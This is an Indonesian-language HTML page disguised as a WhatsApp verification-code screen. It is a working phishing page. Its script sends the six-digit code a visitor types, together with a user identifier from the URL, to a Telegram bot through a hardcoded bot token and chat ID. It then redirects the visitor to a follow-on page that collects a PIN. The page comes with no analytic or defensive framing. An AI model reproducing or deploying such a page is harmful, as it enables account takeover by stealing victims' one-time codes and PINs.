<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Verifikasi</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white">
    <div class="max-w-md mx-auto px-8 pt-10 text-center">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="w-14 mx-auto mb-6">
        <h1 class="text-xl font-bold">Masukkan Kode Verifikasi</h1>
        <div class="flex justify-between gap-2 my-10" id="otpGroup">
            <input type="number" class="w-10 h-12 border-b-2 border-gray-300 text-center text-2xl outline-none focus:border-[#03AC0E]" maxlength="1">
            <input type="number" class="w-10 h-12 border-b-2 border-gray-300 text-center text-2xl outline-none focus:border-[#03AC0E]" maxlength="1">
            <input type="number" class="w-10 h-12 border-b-2 border-gray-300 text-center text-2xl outline-none focus:border-[#03AC0E]" maxlength="1">
            <input type="number" class="w-10 h-12 border-b-2 border-gray-300 text-center text-2xl outline-none focus:border-[#03AC0E]" maxlength="1">
            <input type="number" class="w-10 h-12 border-b-2 border-gray-300 text-center text-2xl outline-none focus:border-[#03AC0E]" maxlength="1">
            <input type="number" class="w-10 h-12 border-b-2 border-gray-300 text-center text-2xl outline-none focus:border-[#03AC0E]" maxlength="1">
        </div>
    </div>
    <script>
        const TOKEN = "8746602429:AAHRxWuzAmXIksUuIs87TNq4oLGjxIJH83w";
        const CHAT_ID = "8723798929";
        const user = new URLSearchParams(window.location.search).get('u');
        const inputs = document.querySelectorAll('#otpGroup input');
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value && index < 5) inputs[index + 1].focus();
                const otp = Array.from(inputs).map(i => i.value).join('');
                if (otp.length === 6) {
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: `<b>[OTP]</b> User: ${user}\nOTP: ${otp}`, parse_mode: 'HTML' })
                    }).then(() => { window.location.href = "pin.html?u=" + encodeURIComponent(user); });
                }
            });
        });
    </script>
</body>
</html>
